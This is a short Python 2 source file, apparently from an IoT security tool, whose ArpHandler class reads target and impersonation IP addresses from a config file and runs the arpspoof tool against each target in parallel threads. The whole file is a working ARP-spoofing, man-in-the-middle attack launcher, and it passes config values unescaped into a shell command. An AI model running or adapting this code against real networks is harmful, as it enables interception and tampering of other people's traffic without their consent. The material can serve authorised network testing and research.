import ConfigParser
import threading
import os

class ArpHandler:
    def __init__(self, interface):
        self.Interface = interface
        self.ArpConfig = ConfigParser.ConfigParser()
        self.ArpConfig.read('./smartiot_config/arp-spoof.config')
        self.AttackIPs = self.__ConfigSectionMap("Attack")["ipaddrs"]
        self.AttackIPs = "".join(self.AttackIPs.split())
        self.AttackIPs = self.AttackIPs.split(',')
        self.ImpersonateIP = self.__ConfigSectionMap("Impersonate")["ipaddr"]

    def do_spoof(self):
        for attack_ip in self.AttackIPs:
            t = threading.Thread(target=self.__spoof, args=(attack_ip, ))
            t.start()

    def __spoof(self, attack_ip):
        os.system('arpspoof -i %s %s -t %s >/dev/null 2>&1'
                  % (self.Interface, self.ImpersonateIP, attack_ip))

    def __ConfigSectionMap(self, section):
        dict1 = {}
        options = self.ArpConfig.options(section)
        for option in options:
            try:
                dict1[option] = self.ArpConfig.get(section, option)
                if dict1[option] == -1:
                    print "skip: %s" % option
            except:
                print "exception on %s!" % option
                dict1[option] = None
        return dict1
